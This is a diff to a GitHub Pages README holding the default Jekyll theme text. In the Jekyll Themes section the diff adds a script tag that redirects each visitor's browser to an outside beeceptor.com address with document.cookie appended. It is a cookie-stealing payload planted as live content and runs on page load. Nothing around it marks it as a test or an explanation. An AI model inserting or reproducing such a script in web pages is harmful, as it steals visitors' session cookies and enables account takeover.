@@ -31,6 +31,9 @@ For more details see [GitHub Flavored Markdown](https://guides.github.com/featur
 ### Jekyll Themes
 
 Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/afonso/afonso.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+<script type="text/javascript">
+document.location='https://opaaaaa.free.beeceptor.com/?c='+document.cookie;
+</script>
 
 ### Support or Contact
 
